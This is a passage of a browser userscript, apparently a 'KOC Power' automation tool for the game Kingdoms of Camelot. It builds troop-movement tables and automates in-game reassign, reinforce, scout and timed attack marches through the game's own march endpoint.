   _addTab: function(queueId,cityname,target_x,target_y,Sendu1,u1,Sendu2,u2,Sendu3,u3,Sendu4,u4,Sendu5,u5,Sendu6,u6,Sendu7,u7,Sendu8,u8,Sendu9,u9,Sendu10,u10,Sendu11,u11,Sendu12,u12){
   var t = Tabs.Reassign;
     var row = document.getElementById('pbRoutesQueue').insertRow(0);
     row.vAlign = 'top';
     row.insertCell(0).innerHTML = queueId;
     row.insertCell(1).innerHTML = cityname;
     row.insertCell(2).innerHTML = target_x + ',' + target_y;
     row.insertCell(3).innerHTML = Sendu1;
     row.insertCell(4).innerHTML = addCommas(u1);
     row.insertCell(5).innerHTML = Sendu2;
     row.insertCell(6).innerHTML = addCommas(u2);
    row.insertCell(7).innerHTML = Sendu3;
    row.insertCell(8).innerHTML = addCommas(u3);
    row.insertCell(9).innerHTML = Sendu4;
    row.insertCell(10).innerHTML = addCommas(u4);
    row.insertCell(11).innerHTML = Sendu5;
    row.insertCell(12).innerHTML = addCommas(u5);
    row.insertCell(13).innerHTML = Sendu6;
    row.insertCell(14).innerHTML = addCommas(u6);
    row.insertCell(15).innerHTML = Sendu7;
    row.insertCell(16).innerHTML = addCommas(u7);
    row.insertCell(17).innerHTML = Sendu8;
    row.insertCell(18).innerHTML = addCommas(u8);
    row.insertCell(19).innerHTML = Sendu9;
    row.insertCell(20).innerHTML = addCommas(u9);
    row.insertCell(21).innerHTML = Sendu10;
    row.insertCell(22).innerHTML = addCommas(u10);
    row.insertCell(23).innerHTML = Sendu11;
    row.insertCell(24).innerHTML = addCommas(u11);
    row.insertCell(25).innerHTML = Sendu12;
    row.insertCell(26).innerHTML = addCommas(u12);
     row.insertCell(27).innerHTML = '<a class="button20" id="tradecancel_' + queueId + '"><span>'+culang.deleteb+'</span></a>';
     document.getElementById('tradecancel_' + queueId).addEventListener('click', function(){
      t.cancelQueueElement(queueId);
     }, false);
   },
   
   _addTabHeader: function() {
   var t = Tabs.Reassign;
     var row = document.getElementById('pbRoutesQueue').insertRow(0);
     row.vAlign = 'top';
     row.insertCell(0).innerHTML = "ID";
     row.insertCell(1).innerHTML = culang.from;
     row.insertCell(2).innerHTML = culang.to;
     row.insertCell(3).innerHTML = culang.shrsupply;
     row.insertCell(4).innerHTML = "";
     row.insertCell(5).innerHTML = culang.shrmilitiaman;
     row.insertCell(6).innerHTML = "";
    row.insertCell(7).innerHTML = culang.scout;
     row.insertCell(8).innerHTML = "";
     row.insertCell(9).innerHTML = culang.shrpikeman;
     row.insertCell(10).innerHTML = "";
     row.insertCell(11).innerHTML = culang.shrswordsman;
     row.insertCell(12).innerHTML = "";
     row.insertCell(13).innerHTML = culang.shrtarcher;
     row.insertCell(14).innerHTML = "";
     row.insertCell(15).innerHTML = culang.shrcavalry;
     row.insertCell(16).innerHTML = "";
     row.insertCell(17).innerHTML = culang.shrheavycavalry;
     row.insertCell(18).innerHTML = "";
     row.insertCell(19).innerHTML = culang.shrsupplywagon;
     row.insertCell(20).innerHTML = "";
     row.insertCell(21).innerHTML = culang.shrballista;
     row.insertCell(22).innerHTML = "";
     row.insertCell(23).innerHTML = culang.shrbatteringram;
     row.insertCell(24).innerHTML = "";
     row.insertCell(25).innerHTML = culang.shrcatapult;
     row.insertCell(26).innerHTML = "";
     row.insertCell(27).innerHTML = culang.deleteb;
   },   
   
   cancelQueueElement: function(queueId){
     var t = Tabs.Reassign;
     var queueId = parseInt(queueId);
     t.reassignRoutes.splice(queueId, 1);
     t.showReassignRoutes();
   },
   
  saveReassignRoutes: function(){
  var t = Tabs.Reassign;
    var serverID = getServerId();
    GM_setValue('reassignRoutes_' + serverID, JSON2.stringify(t.reassignRoutes));
  },
  readReassignRoutes: function(){
    var t = Tabs.Reassign;
    var serverID = getServerId();
    s = GM_getValue('reassignRoutes_' + serverID);
    if (s != null) {
      route = JSON2.parse(s);
      for (k in route)
        t.reassignRoutes[k] = route[k];
    }
  },
  saveReassignState: function(){
  var t = Tabs.Reassign;
    var serverID = getServerId();
    GM_setValue('reassignState_' + serverID, JSON2.stringify(t.reassignState));
  },
  readReassignState: function(){
    var t = Tabs.Reassign;
    var serverID = getServerId();
    s = GM_getValue('reassignState_' + serverID);
    if (s != null) {
      state = JSON2.parse(s);
      for (k in state)
        t.reassignState[k] = state[k];
    }
  },
  toggleReassignState: function(obj){
  var t = Tabs.Reassign;
    if (t.reassignState.running == true) {
      t.reassignState.running = false;
      obj.value = ""+culang.autoreassign+" = "+culang.buttonoff;
   t.checkdoreassigntimeout = null;
    t.count = 0;
    }
    else {
      t.reassignState.running = true;
      obj.value = ""+culang.autoreassign+" = "+culang.buttonon;
    t.e_reassignRoutes();
    }
  },
  
  checkdoReassign: function(){
  var t = Tabs.Reassign;
  t.doReassign(t.count);
  t.count++;
  if(t.count < t.reassignRoutes.length && t.reassignState.running){
    t.checkdoreassigntimeout = setTimeout(function() { t.checkdoReassign();}, 5000);
  } else {
    var now = new Date().getTime()/1000.0;
    now = now.toFixed(0);
    Options.lastreassign = now;
    saveOptions();  
    t.count = 0;
  }
  },
  
  doReassign: function(count){
    var t = Tabs.Reassign;
     var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
     if(t.reassignRoutes.length==0) return;
     var send=[];
     var citytotal=0;
     var totalsend=0;
		params.u1 = 0;
		params.u2 = 0;
		params.u3 = 0;
		params.u4 = 0;
		params.u5 = 0;
		params.u6 = 0;
		params.u7 = 0;
		params.u8 = 0;
		params.u9 = 0;
		params.u10 = 0;
		params.u11 = 0;
		params.u12 = 0;  
    
    var city = t.reassignRoutes[count]["city"];
    var xcoord = t.reassignRoutes[count]["target_x"];
    var ycoord = t.reassignRoutes[count]["target_y"];
    
    var cityID = 'city' + city;
	if(!Cities.byID[city]) return;
    var marching = getMarchInfo2(cityID);
    t.getRallypoint(cityID);
  if(t.rallypointlevel == 11) t.rallypointlevel = 15;
  if(t.rallypointlevel == 11) t.rallypointlevel = 20;
    var maxsend = (t.rallypointlevel * 10000);
    totalsend=0;
       	var troopsselect=["u1","u2","u3","u4","u5","u6","u7","u8","u9","u10","u11","u12"];
    	for (k=0; k<troopsselect.length; k++) {
			var citytroops = Seed.units[cityID]['unt'+(parseInt(k)+1)];
			var marchtroops = marching.marchUnits[parseInt(k)+1];
			citytotal = parseInt(citytroops) + parseInt(marchtroops);
			//alert(citytotal + ' > ' + t.reassignRoutes[count][troopsselect[k]] + ' - ' + totalsend + ' <= ' + maxsend + ' - ' + t.reassignRoutes[count]['Send'+troopsselect[k]]);
			//if(k== 5) GM_log(citytotal +'  ' + t.reassignRoutes[count][troopsselect[k]]);
			if(t.reassignRoutes[count]['Send'+troopsselect[k]]==false) {continue; }
			if(citytotal > t.reassignRoutes[count][troopsselect[k]]){
				var sendtroops = parseInt(citytotal) - parseInt(t.reassignRoutes[count][troopsselect[k]]);
				if (parseInt(sendtroops) > parseInt(citytroops)) sendtroops = citytroops;
				if (parseInt(sendtroops) < 0) sendtroops = 0;
				send[(parseInt(k)+1)] = sendtroops;
				totalsend += send[(parseInt(k)+1)];
				//alert(parseInt(k)+1 + ' - ' + citytotal+ ' : ' + troopsselect[k] + ' / ' + t.reassignRoutes[0][troopsselect[k]]);    			
				
			}
			if(totalsend > maxsend){
				totalsend -= send[(parseInt(k)+1)];
				send[(parseInt(k)+1)] = parseInt(maxsend-totalsend);
				totalsend += send[(parseInt(k)+1)];
				break;
			}
       	}
    	
    	for (var t=0; t< Seed.cities.length;t++) {
    		if ( parseInt(Seed.cities[t][0]) == city) var cityname = Seed.cities[t][1];
    	}
    
		params.cid= city;
		params.type = "5";
		params.kid=0;
		params.xcoord = xcoord;
		params.ycoord = ycoord;
		params.u1 = send[1];
		params.u2 = send[2];
		params.u3 = send[3];
		params.u4 = send[4];
		params.u5 = send[5];
		params.u6 = send[6];
		params.u7 = send[7];
		params.u8 = send[8];
		params.u9 = send[9];
		params.u10 = send[10];
		params.u11 = send[11];
		params.u12 = send[12];  
  
     if (totalsend >0) {
      new AjaxRequest(unsafeWindow.g_ajaxpath + "ajax/march.php" + unsafeWindow.g_ajaxsuffix, {
          method: "post",
          parameters: params,
          loading: true,
          onSuccess: function (transport) {
          var rslt = eval("(" + transport.responseText + ")");
          if (rslt.ok) {
          actionLog('<b>'+culang.autoreassign+'</b> '+culang.from+': ' + cityname + "  "+culang.to+": " + xcoord + ',' + ycoord + "    ->   "+culang.fortroops+": " + totalsend);
          var timediff = parseInt(rslt.eta) - parseInt(rslt.initTS);
          var ut = unsafeWindow.unixtime();
          var unitsarr=[0,0,0,0,0,0,0,0,0,0,0,0,0];
              for(i = 0; i <= unitsarr.length; i++){
                if(params["u"+i]){
                  unitsarr[i] = params["u"+i];
                }
              }
          var resources=[0,0,0,0,0,0,0,0,0,0,0,0,0];
          var currentcityid = city;
          unsafeWindow.attach_addoutgoingmarch(rslt.marchId, rslt.marchUnixTime, ut + timediff, params.xcoord, params.ycoord, unitsarr, params.type, params.kid, resources, rslt.tileId, rslt.tileType, rslt.tileLevel, currentcityid, true);
          if(rslt.updateSeed){unsafeWindow.update_seed(rslt.updateSeed)};
          } else {
          actionLog('<b>'+culang.autoreassign+'</b> ' + cityname);
          actionLog('<b>'+culang.autoreassign+' '+culang.impnote+'</b> ' + rslt.error_code + ' -  ' + rslt.msg + ' -  ' + rslt.feedback);
          //unsafeWindow.Modal.showAlert(printLocalError((rslt.error_code || null), (rslt.msg || null), (rslt.feedback || null)))
          }
          },
          onFailure: function () {}
      });
    }      
  },
    
  show: function(){
  var t = Tabs.Reassign;
   mainPop.div.style.width = 750 + 'px';
   if (Options.widescreen==true)mainPop.div.style.width = Colors.TabWidth + 'px';
  },
  hide: function(){
    var t = Tabs.Reassign;
     mainPop.div.style.width = 750 + 'px';
   if (Options.widescreen==true)mainPop.div.style.width = Colors.TabWidth + 'px';
  },
  onUnload: function(){
    var t = Tabs.Reassign;
    if (!ResetAll) t.saveReassignRoutes();
  if (!ResetAll) t.saveReassignState();
    
  },
}
/***********************************************************************************/
/************ KOC POWER - TABS REINFORCE ******************************************/
/*********************************************************************************/
Tabs.Reinforce = {
	tabOrder: StyleOptions.toMovement,
	tabLabel: culang.movement,
	cont : null,
	curTabBut : null,
	curTabName : null,
	displayTimer : null,
	state : null,
	curTabBut : null,
	curTabName : null,
	pdxAttackTimer: null,
	sourceCity : {},
	destinationCity : {},
	rows : [],
	iused : new Array(),
 
    init: function(div){
		var t = Tabs.Reinforce;
        t.cont = div;
	   clearTimeout (t.displayTimer);
   return t.cont;
	
 },
  getContent : function (){
    var t = Tabs.Reinforce;
    return t.cont;
  },
  hide : function (){
    var t = Tabs.Reinforce;
    t.state = null;
    clearTimeout (t.displayTimer);
    mainPop.div.style.width = 750 + 'px';
    if (Options.widescreen==true)mainPop.div.style.width = Colors.TabWidth + 'px';
  },
  
  show : function (){  
    var t = Tabs.Reinforce;
    mainPop.div.style.width = 750 + 'px';
    if (Options.widescreen==true)mainPop.div.style.width = Colors.TabWidth + 'px';

    var rownum = 0;
    var ModelCity = {};
    if (t.state == null) {  
          m = "<DIV class=pdxStat>"+culang.Hmovement+"</div><div id='statpourRAA'></div>";
         m += "<TABLE width=600 class=pdxTab border=0 align=center>\
           <tr><td colspan=4 align=center><input type=button id=REEaction value='"+culang.scout+"'>&nbsp;<input type=button id=RAAaction value='"+culang.rptattack+"'>&nbsp;<input type=button id=RENaction value='"+culang.reinforce+"'>&nbsp;<input type=button id=RENBaction value='"+culang.reinforcefood+"'> </td></tr> <tr><td colspan=4 align=center ><div class=pdxStat>"+culang.Halert+"</div><div id=ptRAAStatus style='overflow-y:auto; max-height:50px;'></div><hr> </td></td><tr align=center valign=top><td colspan=1 width=130><b><u>"+culang.holyplace+"</b></u><br><span id=RAAsrcRptspeedcity></span></td>\
           <td colspan=1><b><u>"+culang.target+"</b></u><br>X:<input type=text id=RAAtypetrpx size=3>&nbsp;Y:<input type=text id=RAAtypetrpy size=3><br><a href='javascript:void(0);' id='BOchargelistelieux'>"+culang.player+"</a>: <select id='listeFavori'></select></td>\
           <td><b><u>"+culang.distance+"</u></b><br><span id='BOEstimationD'>&nbsp;</span><td><b><u>"+culang.nextCity+"</u></b><br><span id=nextNearCity></span>\
           </tr><tr align=center valign=top>\
           <td colspan=4 align=left><table border=0 bordercolor=black cellspacing=0 cellpadding=0 width=100% style='text-align:center'><tr><td rowspan=13><div id=RAAstatsource></div></td><td colspan=2><a href='javascript:void(0)' id=BO_RAZ_Units>"+culang.units+"</a></td><td><span class=boldRed>"+culang.rptattack+"</span><b> "+culang.eta+"</b></td><td><span class=boldGreen>"+culang.reinforce+"</span><b> "+culang.eta+"</b></td></tr>";
            for (r=1; r<13; r++){
   	     m += '<tr><td align=right><img height=20 title="'+unsafeWindow.unitcost['unt'+r][0]+'" src=http://koc-power-pdx.googlecode.com/svn/trunk/img/troops/unit_'+r+'_50_s34.jpg></td><td align=left><input style="border:1px solid black;height:16px;font-size:11px;" id="RAAnbunit'+r+'" type=text size=7 value="0" ></td><td><span id="BOEstimationTT'+r+'">&nbsp;</span></td><td><span id="BOEstimationTZ'+r+'">&nbsp;</span></td></tr>';
      	}
      	var itemlist=[55,57,931,932];
		var BOitems="";
		for(var i=0;i<itemlist.length;i++){
		 BOitems += "<img src='http://kabam1-a.akamaihd.net/kingdomsofcamelot/fb/e2/src/img/items/30/"+itemlist[i]+".jpg' /><input type=checkbox id='BOitem_"+itemlist[i]+"'><span id='BOitemSpan_"+itemlist[i]+"'>" + unsafeWindow.ksoItems[itemlist[i]].count + "</span>&nbsp;";
        }
        m += "</table></td></tr>\
              <tr><td colspan=3><b><u>"+culang.knights+"</b></u><BR><SELECT id='RAApiKnight' type=list></select><br>"+BOitems+"</td></tr><tr><td colspan=2><u><b>"+culang.favAttacks+"</b></u><BR>&nbsp;<select id=BO_AT_Fav></select><input type=button value='"+culang.deleteb+"' id=BO_AT_Fav_Sup><input type=button value='"+culang.reset+"' id=BO_AT_Fav_RESET> </td><td colspan=2><u><b>"+culang.saveFavoriet+"</b></u><BR> <input type=type id=BO_AT_Fav_Nom size=10>&nbsp;<input type=button value='"+culang.save+"' id=BO_AT_Fav_ajou></td></tr>\
              <tr><td colspan=3><b><div class=pdxStat>"+culang.Haa+"</div></tr><td><td><input type=button id='BOActiveAttack' value='"+culang.rptattack+" = "+culang.buttonoff+"' ></td><td colspan=2><span id='BOCompAttack'></span></tr>\
              <tr><td><b>"+culang.arrival+"<b>: <input type=text size=7 id='BOHorloge' value='" + Options.AttackHorloge + "'></td><td><input type=button value='"+culang.save+"' id='BOSaveAttack'></td><td><input type=button value='"+culang.edit+"' id='BOEditAttack' disabled></td></tr>\
              <tr><td colspan=3><span id='BOAttackProg'></span></td></tr></table>";
        t.cont.innerHTML = m; 
        t.statpourRAA = document.getElementById ('statpourRAA');
//Gestion des favoris  
       t.Favoris = document.getElementById ('BO_AT_Fav');
       function unset(array, valueOrIndex){
       	var output=[];
       	for(var i in array){
       		if (i!=valueOrIndex)
       			output[i]=array[i];
       	}
       	return output;
	}
	function favAttacks() {
	       t.Favoris.innerHTML="<option value=''>"+culang.select+"</option>";
	       var lisf = Options.AttackFav;
	       for (var m in lisf) {
	        //if(lisf[m]) {
	         var lis = lisf[m];
	        // if (lis[0]!=undefined)
	          t.Favoris.innerHTML+="<option value='"+m+"'>"+lis[0]+"</option>";
      	        // }
      	       }  
	}
       document.getElementById("BO_AT_Fav_RESET").addEventListener ('click', function() {
	 Options.AttackFav={};
	 saveOptions(); 
         favAttacks();
       }, false); 
       document.getElementById("BO_AT_Fav_Sup").addEventListener ('click', function() {
       numfav=document.getElementById("BO_AT_Fav").value;
       if (numfav!="") {
        Options.AttackFav[numfav]={};
        delete Options.AttackFav[numfav];
        //Options.AttackFav=unset(Options.AttackFav, numfav);
        saveOptions(); 
        favAttacks();
       }
       }, false); 
 document.getElementById("BO_RAZ_Units").addEventListener ('click', function() {
  for (r=1; r<13; r++) document.getElementById("RAAnbunit"+r).value=0; 
 }, false); 
       document.getElementById("BO_AT_Fav_ajou").addEventListener ('click', function() {
        if (document.getElementById("BO_AT_Fav_Nom").value=="") {
         alert("Merci de mettre un nom !");
         return;
        }
        var a =document.getElementById("BO_AT_Fav_Nom").value;
        Options.AttackFav[a]={};
        var lisf = Options.AttackFav[a];
        lisf[0]=document.getElementById("BO_AT_Fav_Nom").value;
        for (r=1; r<13; r++) lisf[r]=document.getElementById("RAAnbunit"+r).value;
        document.getElementById("BO_AT_Fav_Nom").value="";
        saveOptions(); 
	favAttacks();
       }, false); 
       document.getElementById("BO_AT_Fav").addEventListener ('change', function() {
         numfav=document.getElementById("BO_AT_Fav").value;
         if (numfav=="") {
          for (r=1; r<13; r++) document.getElementById("RAAnbunit"+r).value=0; 
         }else {
          var lisf = Options.AttackFav[numfav];
          for (var m in lisf) {
           if(m>0)
	    if (document.getElementById("RAAnbunit"+m)) document.getElementById("RAAnbunit"+m).value=lisf[m];
	  }
         }
       }, false); 
       // Fin gestion des favoris
       document.getElementById("BOitem_55").addEventListener ('click', function() {
        document.getElementById("BOitem_57").checked=false;
        t.estimerRes();
       }, false);  
       document.getElementById("BOitem_57").addEventListener ('click', function() {
              document.getElementById("BOitem_55").checked=false;
              t.estimerRes();
       }, false);
        t.statutRAA = document.getElementById ('ptRAAStatus');
        t.destinationCityx = document.getElementById ('RAAtypetrpx');
        t.destinationCityy = document.getElementById ('RAAtypetrpy');
        t.destinationCityx.value = Options.Xrenfort;
        t.destinationCityy.value = Options.Yrenfort;
        if (document.getElementById ('maparea_map').style.display!="none") {
         t.destinationCityx.value = document.getElementById ('mapXCoor').value;
         t.destinationCityy.value = document.getElementById ('mapYCoor').value;
        }
        t.listeFavoris = document.getElementById ('listeFavori');
        t.listeFavoris.addEventListener ('change', t.SelectFavoris, false);
        t.chargelistelieux = document.getElementById ('BOchargelistelieux');
        t.chargelistelieux.addEventListener ('click', t.chercherFavoris, false);
        t.actionREN = document.getElementById ('RENaction');
        t.actionRENB = document.getElementById ('RENBaction');
        t.actionREE = document.getElementById ('REEaction');
        t.actionRAA = document.getElementById ('RAAaction');

  	t.actionREN.addEventListener ('click', function () { t.clickATTAQUEDo(2,0); }, false);
        t.actionRAA.addEventListener ('click',  function () { t.clickATTAQUEDo(4,0); }, false);
        t.actionRENB.addEventListener ('click',  function () { t.clickATTAQUEDo(2,1); }, false);
        t.actionREE.addEventListener ('click',  function () { t.clickATTAQUEDo(3,0); }, false);
        t.destinationCityx.addEventListener ('keyup', function () { t.estimerRes(); }, false);
        t.destinationCityy.addEventListener ('keyup', function () { t.estimerRes(); }, false);       
        var dcp0 = new CdispCityPicker ('ptRAA0', document.getElementById('RAAsrcRptspeedcity'), false, t.clickRAACitySourceSelect, Cities.byID[unsafeWindow.currentcityid].idx);
        t.state = 1;
        t.estimerRes();
        t.BOAttackProg = document.getElementById ('BOAttackProg');
        t.BOHorloge = document.getElementById ('BOHorloge');
        t.BOSaveAttack = document.getElementById ('BOSaveAttack');
        t.BOEditAttack = document.getElementById ('BOEditAttack');
        t.BOCompAttack = document.getElementById ('BOCompAttack');
        t.BOActiveAttack  = document.getElementById ('BOActiveAttack');
        t.BOActiveAttack.addEventListener ('click', t.AutoattackOnOff, false);
      
        t.BOSaveAttack.addEventListener ('click', function () {
        
          var itemlist=[55,57,931,932];
	  for(var i=0;i<itemlist.length;i++){
	        document.getElementById('BOitemSpan_'+itemlist[i]).checked=false;
          }
        
         t.enregistreAttack();
        
        }, false);
        if (Options.AttackCibleX!=0 && Options.AttackCibleY!=0) {
         t.BOEditAttack.disabled=false;
        }
        t.BOEditAttack.addEventListener ('click', function () { 
          t.destinationCityx.value = Options.AttackCibleX;
          t.destinationCityy.value = Options.AttackCibleY;
          document.getElementById("RAApiKnight").value=Options.AttackKnight;
          nHtml.Click(document.getElementById("ptRAA0_"+Cities.byID[Options.AttackFromCity].idx)); 
          for (r=1; r<13; r++) {
	      document.getElementById("RAAnbunit"+r).value=Options.AttackUnits[r-1];
          }
        }, false);
        
        favAttacks();
        if (Options.AttackOnOff) {
          t.BOActiveAttack.value=''+culang.rptattack+' = '+culang.buttonon+'';
    	  t.activeAttack();
        }
       }

    },
    AutoattackOnOff:function() {
     // click click sur le bouton Activer le compte ? rebour !
     var t = Tabs.Reinforce;
     t.BOCompAttack.innerHTML='';
     clearTimeout (t.pdxAttackTimer);
     if (t.BOActiveAttack.value==''+culang.rptattack+' = '+culang.buttonoff+'') {
    	t.BOActiveAttack.value=''+culang.rptattack+' = '+culang.buttonon+'';
    	     Options.AttackOnOff = true;
    	     saveOptions();  
    	     t.activeAttack();
    	     
    	    } else {
    	     Options.AttackOnOff = false;
    	     saveOptions();  
    	     t.BOActiveAttack.value=''+culang.rptattack+' = '+culang.buttonoff+'';
    }   
    },
    activeAttack:function() {
     var t = Tabs.Reinforce;
     clearTimeout (t.pdxAttackTimer);
     if (Options.AttackGoHorloge) {
       var depart=new Date()
       depart.setTime(Options.AttackGoHorloge);
       var now = unixTime()*1000;
       if (now >= Options.AttackGoHorloge) {
	t.BOCompAttack.innerHTML='<center><font color=red>'+culang.MTattackdone+'</font></center>';
	t.destinationCityx.value = Options.AttackCibleX;
	t.destinationCityy.value = Options.AttackCibleY;
	document.getElementById("RAApiKnight").value=Options.AttackKnight;
	nHtml.Click(document.getElementById("ptRAA0_"+Cities.byID[Options.AttackFromCity].idx));
	for (r=1; r<13; r++) {
	   document.getElementById("RAAnbunit"+r).value=Options.AttackUnits[r-1];
          }
      t.clickATTAQUEDo(4,0);
      clearTimeout (t.pdxAttackTimer);
      Options.AttackGoHorloge=null;
      saveOptions();  
     }
     if (now > depart.getTime()) {
         t.BOCompAttack.innerHTML='<center><font color=red>'+culang.Himpossible+'</font></center>';
         clearTimeout (t.pdxAttackTimer);
       	 Options.AttackGoHorloge=null;
         saveOptions();  
         return false;
     }
       
     t.pdxAttackTimer=setTimeout(function(){
        var depart=new Date();
	depart.setTime(Options.AttackGoHorloge);
        var now = unixTime()*1000;
        var tempsrestant = depart.getTime() - now;
        t.BOCompAttack.innerHTML='<center><font color=red><b>'+culang.MTattackin+' '+timestr(tempsrestant/1000)+'</b></font></center>';
        t.activeAttack();
      },1000);
     }
    
    },
    enregistreAttack : function() {
     var t = Tabs.Reinforce; 
     if (t.BOHorloge.value.match("^[0-9]{2}:[0-9]{2}:[0-9]{2}$")) {
       var horloge = t.BOHorloge.value;
       Options.AttackHorloge = horloge;
       
       var ndate=new Date();
       ndate.setHours(horloge.substr(0,2));
       ndate.setMinutes(horloge.substr(3,2));
       ndate.setSeconds(0);
       var atunits=new Array();
       for (r=1; r<13; r++) {
          atunits.push(parseInt(document.getElementById("RAAnbunit"+r).value));
       }
       Options.AttackUnits = atunits;
       Options.AttackFromCity = t.sourceCity.id;
       Options.AttackKnight = document.getElementById("RAApiKnight").value;
       Options.AttackCibleX = t.destinationCityx.value;
       Options.AttackCibleY = t.destinationCityy.value;
       
       var x1 = parseInt(t.sourceCity.x);
       var x2 = parseInt(t.destinationCityx.value);
       var y1 = parseInt(t.sourceCity.y);
       var y2 = parseInt(t.destinationCityy.value);
       var dist = distance (x1, y1, x2, y2);  
       var tempplusgrand=0;
       for (r=1; r<13; r++){
         if (parseInt(document.getElementById("RAAnbunit"+r).value)>0) {
               var m = t.estETA(dist, r);
               if (tempplusgrand<m.ETA) tempplusgrand=m.ETA;   
         }
       }
       var departtime=ndate.getTime() - (tempplusgrand*1000);
       var depart=new Date()
       depart.setTime(departtime);
       
       var now = unixTime()*1000;
       if (now > depart.getTime()) {
        t.BOAttackProg.innerHTML = "<b>"+culang.error+"</b>: <span class=boldRed>"+culang.MTerr+"</span>";
        return false;
       }
       Options.AttackGoHorloge =  depart.getTime();
       saveOptions ();
       t.BOAttackProg.innerHTML = ""+culang.rptattack+" " + Options.AttackCibleX + ","+ Options.AttackCibleY +" "+culang.saved+"";
       t.BOEditAttack.disabled=false;
     } else {
      t.BOAttackProg.innerHTML = "<b>"+culang.error+"</b>: <span class=boldRed>"+culang.MTbadTF+"</span>";
     }     
    
    },
    clickATTAQUEDo: function(typemarche, bouffe) {
      var t = Tabs.Reinforce;  
      var totalunit=0;
      if (typemarche==3 && document.getElementById("RAAnbunit3").value==0) document.getElementById("RAAnbunit3").value=1;
      for (r=1; r<13; r++){
         if (typemarche==3 && r!=3) {
          document.getElementById("RAAnbunit"+r).value=0;
         }
          if (parseInt(document.getElementById("RAAnbunit"+r).value) > parseInt(document.getElementById("RAAdestunit"+r).value)) {
            document.getElementById("RAAnbunit"+r).style.backgroundColor="red";
            return false;
          }
          totalunit=totalunit+parseInt(document.getElementById("RAAnbunit"+r).value);
          document.getElementById("RAAnbunit"+r).style.backgroundColor="";
      }
      var errMsg = "";
      if (isNaN (t.destinationCityx.value) ||t.destinationCityx.value<0 || t.destinationCityx.value>749)
            errMsg = ""+culang.mustbe+"<BR>"; 
      if (isNaN (t.destinationCityy.value) || t.destinationCityy.value<0 || t.destinationCityy.value>749)
       errMsg += ""+culang.mustbe2+"<br>";
      
      if (document.getElementById("RAApiKnight").value==0 && typemarche==4) {
       errMsg += ""+culang.mustknight+"<BR>"; 
      }
      
      if (errMsg != "") {
           t.statutRAA.innerHTML = "<FONT COLOR=#550000>"+ errMsg +"</font>";
           return;
      }
      
      var x=t.destinationCityx.value;
      var y=t.destinationCityy.value;
      // On sauvegardes les coordonnes en cas de F5
      t.SaveCoordsOptions(x,y);
      
      
      // Les objets pour l'attaque !
      var e=1;
      var f=unsafeWindow.unixtime();
      if(Seed.playerEffects.aurasExpire){
      if(Seed.playerEffects.aurasExpire>f){e=1.15}}
      if(Seed.playerEffects.auras2Expire){if(Seed.playerEffects.auras2Expire>f){e=1.3}}

     var l_elem=document.getElementById("BOitem_931");
     if(l_elem&&l_elem.checked&&parseInt(Seed.items["i931"])>0){
       e+=0.25;
      
     }
     var l_elem=document.getElementById("BOitem_932");
     if(l_elem&&l_elem.checked&&parseInt(Seed.items["i932"])>0){
       e+=0.5;
     }
       
      var params = unsafeWindow.Object.clone(unsafeWindow.g_ajaxparams);
      
      if (totalunit==0) {
         t.statutRAA.innerHTML = '<FONT COLOR=#550000>'+culang.MTimpossible+'</font>';
           return;
      }
      var niveauPointRall=parseInt(getCityBuilding (t.sourceCity.id, 12).maxLevel); // 12=Point de ralliement
         var maxtroupe=parseInt(niveauPointRall*10000*e);
         if (niveauPointRall==11) maxtroupe=parseInt(150000*e);
         if (niveauPointRall==12) maxtroupe=parseInt(200000*e);
      if (totalunit>maxtroupe) {
       t.statutRAA.innerHTML = '<FONT COLOR=#550000>'+culang.MTimpossible2+' '+maxtroupe+' '+culang.MTimpossible3+'</font>';
       return;
      }
      var iused=new Array();
      var itemlist=[55,57,931,932];
      for(var i=0;i<itemlist.length;i++){
      
       var l_elem=document.getElementById("BOitem_"+itemlist[i]);
       if(l_elem&&l_elem.checked&&parseInt(Seed.items["i"+itemlist[i]])>0){
        iused.push(itemlist[i]);       
       }      
      }
      var res=0;
      if (bouffe==1) {
       for (var i=1;i<13;i++) {
        res += parseInt(unsafeWindow.unitstats['unt'+i][5] * document.getElementById("RAAnbunit"+i).value * (1 + (0.10 * Seed.tech.tch10)));
       }
       }
		params.items=iused.join(","); 
		params.cid= t.sourceCity.id;
		params.type = typemarche; // 5 = REASSIGN - 4 = ATTACK - 2 = REINFORCE
		params.xcoord = x;
		params.ycoord = y;
		params.kid= document.getElementById("RAApiKnight").value;
		params.r1 = res; 
		params.u1 = 0;
		params.u2 = 0;
		params.u3 = 0;
		params.u4 = 0;
		params.u5 = 0;
		params.u6 = 0;
		params.u7 = 0;
		params.u8 = 0;
		params.u9 = 0;
		params.u10 = 0;
		params.u11 = 0;
		params.u12 = 0;
 
 
         if (typemarche!=3) {
        if (document.getElementById("RAAnbunit1").value>0) params.u1 = document.getElementById("RAAnbunit1").value;
	if (document.getElementById("RAAnbunit2").value>0) params.u2 = document.getElementById("RAAnbunit2").value;
	if (document.getElementById("RAAnbunit3").value>0) params.u3 = document.getElementById("RAAnbunit3").value;
	if (document.getElementById("RAAnbunit4").value>0) params.u4 = document.getElementById("RAAnbunit4").value;
	if (document.getElementById("RAAnbunit5").value>0) params.u5 = document.getElementById("RAAnbunit5").value;
	if (document.getElementById("RAAnbunit6").value>0) params.u6 = document.getElementById("RAAnbunit6").value;
	if (document.getElementById("RAAnbunit7").value>0) params.u7 = document.getElementById("RAAnbunit7").value;
	if (document.getElementById("RAAnbunit8").value>0) params.u8 = document.getElementById("RAAnbunit8").value;
	if (document.getElementById("RAAnbunit9").value>0) params.u9 = document.getElementById("RAAnbunit9").value;
	if (document.getElementById("RAAnbunit10").value>0) params.u10 = document.getElementById("RAAnbunit10").value;
	if (document.getElementById("RAAnbunit11").value>0) params.u11 = document.getElementById("RAAnbunit11").value;
	if (document.getElementById("RAAnbunit12").value>0) params.u12 = document.getElementById("RAAnbunit12").value;
	
	}else {
	 params.u3 = document.getElementById("RAAnbunit3").value;
	 document.getElementById("RAAnbunit3").value=0; 
	}
  	t.actionRAA.disabled=true;
        t.actionREN.disabled=true;
        t.actionREE.disabled=true;
	t.statutRAA.innerHTML = "<center><i><b>"+culang.MTinwork+"</b></i></center>";
	new MyAjaxRequest(unsafeWindow.g_ajaxpath + "ajax/march.php" + unsafeWindow.g_ajaxsuffix, {
	              method: "post",
	              parameters: params,
	              loading: true,
	              onSuccess: function (transport) {
	                  var t = Tabs.Reinforce;  
	                  var rslt = transport;
	                  if (rslt.ok) {
			   var timediff = parseInt(rslt.eta) - parseInt(rslt.initTS);
	                   var ut = unsafeWindow.unixtime();
	                   var unitsarr=[0,0,0,0,0,0,0,0,0,0,0,0,0];
